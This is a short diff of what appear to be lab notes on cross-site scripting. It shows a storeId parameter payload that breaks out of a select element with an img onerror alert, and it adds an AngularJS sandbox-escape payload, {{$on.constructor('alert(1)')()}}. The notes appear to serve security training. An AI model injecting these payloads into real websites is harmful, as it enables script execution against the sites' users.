@@ -40,5 +40,15 @@ productId=1&storeId=London
 // modify storeId param:
 productId=1&storeId=London"></select><img%20src=1%20onerror=alert(1)>
 
+===
+
+// search string gets enclosed in a ng-app directive for angular-js
+// actually, the entire html body is...
+<body ng-app>
+
+// inject.
+{{$on.constructor('alert(1)')()}}
+
+
 
 
